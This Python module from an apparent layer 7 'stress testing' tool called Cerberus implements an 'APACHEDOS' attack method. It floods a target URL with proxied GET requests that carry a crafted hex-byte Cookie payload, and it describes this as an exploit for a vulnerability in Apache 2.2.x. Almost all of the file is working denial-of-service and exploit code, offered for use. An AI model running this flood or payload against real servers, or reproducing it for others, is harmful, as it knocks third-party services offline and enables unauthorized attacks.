# based on https://github.com/JameelNabbo/apacheDOS-POC

'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests

from src.core import Core
from src.utils import *
from src.useragent import *


cookie = (
      "0x30, 0x53, 0x76, 0x99, 0xbc, 0xd7, 0x2, 0x34," 
    + "0x39, 0x5e, 0x7b, 0xc8, 0xbd, 0xfa, 0xff, 0x5b,"
    + "0xa2, 0xe7, 0xa, 0x2d, 0x38, 0x51, 0x40, 0x62, "
    + "0xab, 0xd0, 0xf9, 0x6, 0x2f, 0x4c, 0x6d, 0x89, "
    + "0x14, 0x77, 0x5a, 0xbd, 0x68, 0x93, 0x6e, 0xd0,"
    + "0x1d, 0xd2, 0x5f, 0x6c, 0x59, 0x98, 0xf2, 0xd5,"
    + "0x68, 0x69, 0x50, 0x93, 0xa2, 0x7d, 0xbc, 0x1e,"
    + "0xf, 0x64, 0x3d, 0xaa, 0x8b, 0xe8, 0xc9, 0x25, "
    + "0x78, 0x1b, 0x3e, 0xe1, 0x84, 0x9f, 0x4a, 0x7c," 
    + "0x31, 0xf8, 0x1, 0xae, 0x57, 0x52, 0x77, 0x13, "
    + "0xea, 0x8d, 0x94, 0x17, 0x6e, 0xf9, 0x88, 0x2a,"
    + "0xe3, 0x88, 0xb1, 0x3e, 0x67, 0x4, 0x25, 0xc1, "
    + "0x5c, 0x3f, 0xe2, 0xc5, 0xb0, 0x75, 0x59, 0x36," 
    + "0xf7, 0xea, 0xd7, 0xe4, 0x91, 0x6e, 0x53, 0x2f," 
    + "0x4e, 0x11, 0xf8, 0xdb, 0xaa, 0x85, 0x84, 0x66,"
    + "0x47, 0x1c, 0xf5, 0xe2, 0xc3, 0xa0, 0x81, 0x7d," 
    + "0xa0, 0xe5, 0xc, 0x2f, 0x46, 0x47, 0x72, 0xa4, "
    + "0xa9, 0xce, 0xeb, 0x38, 0x2d, 0x6a, 0x6f, 0xcb,"
    + "0xb2, 0xd5, 0xfc, 0x1f, 0x36, 0x61, 0xd0, 0xf2," 
    + "0xbb, 0xe0, 0x49, 0x56, 0x3f, 0xf6, 0x14, 0x37," 
    + "0xe6, 0xe7, 0xca, 0x2d, 0x18, 0x83, 0x5e, 0xc0," 
    + "0xa5")

def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            headers = utils().buildheaders(url)
            headers.update({'Cookie': cookie}) # update/set the cookie header to our special payload

            Core.session.get(
                utils().buildblock(url), 
                headers=headers,
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'APACHEDOS': {
        'info': 'Exploit which abuses a vulnerability which targets Apache 2.2.x',
        'func': flood
    }
})